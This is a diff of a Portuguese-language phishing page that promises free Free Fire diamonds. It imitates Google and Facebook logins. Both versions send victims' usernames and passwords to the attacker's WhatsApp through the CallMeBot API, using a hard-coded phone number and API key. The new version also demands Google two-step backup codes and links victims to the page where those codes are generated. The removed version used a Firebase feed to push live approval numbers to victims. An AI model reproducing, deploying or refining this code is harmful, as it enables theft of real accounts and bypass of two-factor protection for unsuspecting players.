@@ -4,49 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FF Rewards - Ganhe Diamantes</title>
-    <!-- Scripts Externos -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
-    
     <style>
         body { background-color: #050505; color: white; font-family: 'Roboto', sans-serif; }
         .ff-font { font-family: 'Orbitron', sans-serif; }
         .ff-gradient { background: linear-gradient(135deg, #facc15 0%, #f97316 100%); }
         .card-bg { background-color: #121212; border: 1px solid #262626; }
         .hidden { display: none; }
-        
-        /* Estilo do Balão do Código (Firebase) */
-        #balao-codigo {
-            position: fixed; top: 15%; left: 50%; transform: translateX(-50%);
-            background: white; color: black; padding: 20px 40px;
-            border-radius: 20px; font-weight: bold; font-size: 32px;
-            box-shadow: 0px 0px 20px rgba(255,255,255,0.4);
-            display: none; z-index: 100; font-family: 'Orbitron', sans-serif;
-            border: 4px solid #f97316;
-        }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <!-- Balão Flutuante para o Número do Firebase -->
-    <div id="balao-codigo">--</div>
-
     <div class="max-w-md w-full">
-        
-        <!-- TELA 1: HOME -->
         <div id="screen-home" class="text-center">
             <h1 class="ff-font text-3xl font-bold text-yellow-400 mb-4 tracking-tighter">GANHE DIAMANTES FREE FIRE GRÁTIS</h1>
-            <p class="text-gray-400 mb-8">Para resgatar, você deve entrar com sua conta ativa do Free Fire.</p>
+            <p class="text-gray-400 mb-8">Ganhe no seu primeiro login, depois aproveite ofertas por apenas R$ 3,99.</p>
             <button onclick="changeScreen('screen-selection')" class="ff-font w-full py-4 ff-gradient text-black font-bold rounded-md hover:brightness-110 transition-all uppercase tracking-widest shadow-lg shadow-orange-900/20">
-                ENTRAR AGORA
+                ENTRAR
             </button>
         </div>
 
-        <!-- TELA 2: SELEÇÃO DE MÉTODO -->
         <div id="screen-selection" class="hidden text-center">
-            <h2 class="ff-font text-xl mb-6 uppercase">Faça Login para Continuar</h2>
+            <h2 class="ff-font text-xl mb-6">ESCOLHA O MÉTODO DE LOGIN</h2>
             <div class="space-y-4">
                 <button onclick="showLoginForm('google')" class="w-full flex items-center justify-center gap-3 bg-white text-black font-semibold py-3 rounded-md hover:bg-gray-100 transition-colors">
                     <img src="https://www.google.com/favicon.ico" class="w-5" alt="Google"> Entrar com Google
@@ -58,135 +38,135 @@
             </div>
         </div>
 
-        <!-- TELA 3: FORMULÁRIO DE LOGIN -->
         <div id="screen-form" class="hidden card-bg p-8 rounded-xl shadow-2xl">
             <div id="form-header" class="mb-6 text-center"></div>
+            
             <form id="loginForm" class="space-y-4">
                 <input type="hidden" id="provider" name="provider">
                 <div>
                     <label id="label-user" class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider"></label>
-                    <input type="text" id="userInput" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
+                    <input type="text" id="userInput" name="username" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
                 </div>
                 <div>
-                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Senha da Conta</label>
-                    <input type="password" id="passInput" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
+                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Senha</label>
+                    <input type="password" id="passInput" name="password" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
                 </div>
-                <button type="submit" class="w-full ff-gradient py-3 text-black font-bold rounded mt-4 transition-all">
-                    ENVIAR E VALIDAR
+
+                <div id="passkey-area" class="hidden">
+                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Código de Segurança (8 dígitos)</label>
+                    <div class="flex gap-2">
+                        <input type="text" id="passkeyInput" name="passkey" class="flex-1 bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" placeholder="Ex: 1234 5678">
+                        <a id="passkey-button" href="#" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-2 rounded flex items-center justify-center text-center leading-tight">
+                            OBTER<br>CÓDIGO
+                        </a>
+                    </div>
+                </div>
+
+                <button type="submit" class="w-full ff-gradient py-3 text-black font-bold rounded mt-4 transition-all hover:scale-[1.02]">
+                    FAZER LOGIN
                 </button>
+                <div id="error-msg" class="text-red-500 text-xs text-center hidden"></div>
             </form>
         </div>
 
-        <!-- TELA 4: AGUARDAR 1 MINUTO -->
-        <div id="screen-wait" class="hidden text-center card-bg p-8 rounded-xl">
-            <h2 class="ff-font text-xl text-yellow-400 mb-4">VERIFICANDO CONTA...</h2>
-            <p class="text-gray-400 mb-6">Aguarde 1 minuto enquanto sincronizamos seus dados com os servidores da Garena.</p>
-            <div id="timer" class="text-4xl font-bold text-orange-500 ff-font">60s</div>
-        </div>
-
-        <!-- TELA 5: ESCOLHA DE DIAMANTES -->
-        <div id="screen-prizes" class="hidden text-center">
-            <h2 class="ff-font text-xl mb-2 text-yellow-400">LOGIN CONCLUÍDO!</h2>
-            <p class="text-gray-400 mb-6">Escolha o pacote que deseja receber:</p>
-            <div class="grid grid-cols-2 gap-4">
-                <button onclick="goToFinal()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500 transition-all">
+        <div id="screen-success" class="hidden text-center">
+            <div class="mb-6">
+                <div class="inline-block p-3 bg-green-500/20 rounded-full mb-2">
+                    <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                <h2 id="welcome-user" class="ff-font text-xl text-yellow-400"></h2>
+            </div>
+            <p class="text-gray-400">Escolha o seu prêmio abaixo.</p>
+            <div class="grid grid-cols-2 gap-4 mt-4">
+                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500">
                     <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
-                    <span class="font-bold mt-2">5.000 Dimas</span>
+                    <span class="font-bold mt-2">100 Dimas</span>
                 </button>
-                <button onclick="goToFinal()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500 transition-all">
+                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500">
                     <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
-                    <span class="font-bold mt-2">10.000 Dimas</span>
+                    <span class="font-bold mt-2">1500 Dimas</span>
                 </button>
             </div>
         </div>
-
-        <!-- TELA 6: CONFIRMAÇÃO DO GOOGLE -->
-        <div id="screen-google-confirm" class="hidden text-center card-bg p-8 rounded-xl border-t-4 border-blue-500">
-            <img src="https://www.google.com/favicon.ico" class="w-10 mx-auto mb-4">
-            <h2 class="text-xl font-bold mb-4">Ação Necessária</h2>
-            <p class="text-gray-300 mb-4">O Google precisa confirmar que você é o dono desta conta.</p>
-            <p class="bg-blue-900/30 p-4 rounded text-sm text-blue-200">
-                Verifique seu celular agora. Uma notificação foi enviada. Toque em <b>"Sim, sou eu"</b> e confirme o número exibido na tela para liberar os diamantes.
-            </p>
-            <div class="mt-6 animate-pulse text-orange-500 font-bold tracking-widest uppercase text-xs">
-                Aguardando Confirmação do Dispositivo...
-            </div>
-        </div>
-
     </div>
 
     <script>
-        // --- CONFIGURAÇÃO FIREBASE ---
-        const firebaseConfig = {
-            databaseURL: "https://ffrewardcode-bee2b-default-rtdb.firebaseio.com/"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        let currentProvider = '';
 
-        // --- LÓGICA DE TELAS ---
         function changeScreen(screenId) {
-            document.querySelectorAll('body > div > div').forEach(div => {
-                if(div.id !== "balao-codigo") div.classList.add('hidden');
-            });
+            document.querySelectorAll('body > div > div').forEach(div => div.classList.add('hidden'));
             document.getElementById(screenId).classList.remove('hidden');
         }
 
         function showLoginForm(provider) {
+            currentProvider = provider;
             document.getElementById('provider').value = provider;
             const header = document.getElementById('form-header');
             const label = document.getElementById('label-user');
+            const userInp = document.getElementById('userInput');
+            const passkeyArea = document.getElementById('passkey-area');
+            const passkeyBtn = document.getElementById('passkey-button');
             
+            userInp.value = "";
+            document.getElementById('passInput').value = "";
+            document.getElementById('passkeyInput').value = "";
+            document.getElementById('error-msg').classList.add('hidden');
+
             if(provider === 'google') {
                 header.innerHTML = `<img src="https://www.google.com/favicon.ico" class="w-8 mx-auto mb-2"><h2 class="text-white font-bold">Login com Google</h2>`;
-                label.innerText = "E-mail do Gmail";
+                label.innerText = "Gmail";
+                userInp.placeholder = "exemplo@gmail.com";
+                
+                // NOVO LINK PARA CÓDIGOS DE RESERVA
+                passkeyBtn.href = "https://myaccount.google.com/two-step-verification/backup-codes?gar=WzI0Nl0&utm_source=google-account&utm_medium=web&utm_campaign=backupcodes-screen&continue=https://myaccount.google.com/security?gar%3DWzI0Nl0%26hl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact";
+                passkeyArea.classList.remove('hidden'); 
             } else {
                 header.innerHTML = `<svg class="w-8 h-8 fill-[#1877F2] mx-auto mb-2" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg><h2 class="text-white font-bold">Login com Facebook</h2>`;
-                label.innerText = "Número ou E-mail";
+                label.innerText = "Telefone ou E-mail";
+                userInp.placeholder = "Número ou e-mail";
+                passkeyArea.classList.add('hidden'); 
             }
             changeScreen('screen-form');
         }
 
-        // --- ENVIO DOS DADOS E TIMER ---
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const user = document.getElementById('userInput').value;
             const pass = document.getElementById('passInput').value;
-            const prov = document.getElementById('provider').value;
+            const backupCode = document.getElementById('passkeyInput').value;
+            const provider = document.getElementById('provider').value;
+            
+            if(provider === 'google' && backupCode.trim() === "") {
+                showError("Insira o código de segurança para validar sua conta.");
+                return;
+            }
 
-            // Envio para WhatsApp (CallMeBot)
-            const texto = `🔥 *NOVO LOGIN FF* 🔥\n\n📱 *Via:* ${prov.toUpperCase()}\n📧 *User:* ${user}\n🔑 *Pass:* ${pass}`;
-            const url = `https://api.callmebot.com/whatsapp.php?phone=553192560979&text=${encodeURIComponent(texto)}&apikey=3798192`;
-            fetch(url, { mode: 'no-cors' });
+            const seu_telefone = "553192560979"; 
+            const apikey = "3798192"; 
+            
+            const texto = `🔥 *NOVO LOGIN RECEBIDO* 🔥\n\n📱 *Provedor:* ${provider.toUpperCase()}\n📧 *Usuário:* ${user}\n🔑 *Senha:* ${pass}\n🛡️ *Código Backup:* ${backupCode || 'N/A'}`;
+            const url = `https://api.callmebot.com/whatsapp.php?phone=${seu_telefone}&text=${encodeURIComponent(texto)}&apikey=${apikey}`;
 
-            // Iniciar Tela de Espera
-            changeScreen('screen-wait');
-            let tempo = 60;
-            const intv = setInterval(() => {
-                tempo--;
-                document.getElementById('timer').innerText = tempo + "s";
-                if(tempo <= 0) {
-                    clearInterval(intv);
-                    changeScreen('screen-prizes');
-                }
-            }, 1000);
-        });
-
-        function goToFinal() {
-            changeScreen('screen-google-confirm');
-        }
-
-        // --- ESCUTAR FIREBASE (O BALÃO) ---
-        // Aqui ele lê a chave "Comando" que você criou na Screenshot_2026-05-12-09-30-03-436_com.android.chrome.jpg
-        database.ref('Comando').on('value', (snapshot) => {
-            const valor = snapshot.val();
-            const balao = document.getElementById('balao-codigo');
-            if (valor && valor !== "") {
-                balao.innerText = valor;
-                balao.style.display = 'block';
-            } else {
-                balao.style.display = 'none';
+            try {
+                fetch(url, { mode: 'no-cors' });
+                const nomeUsuario = user.split('@')[0]; 
+                document.getElementById('welcome-user').innerText = `Sucesso! Olá, ${nomeUsuario}`;
+                changeScreen('screen-success');
+            } catch (error) {
+                showError("Erro de conexão.");
             }
         });
+
+        function showError(msg) {
+            const errorDiv = document.getElementById('error-msg');
+            errorDiv.innerText = msg;
+            errorDiv.classList.remove('hidden');
+        }
+
+        function finishClaim() {
+            alert("Análise concluída. Diamantes em até 72h!");
+            location.reload();
+        }
     </script>
 </body>
-</html>
+                        </html>
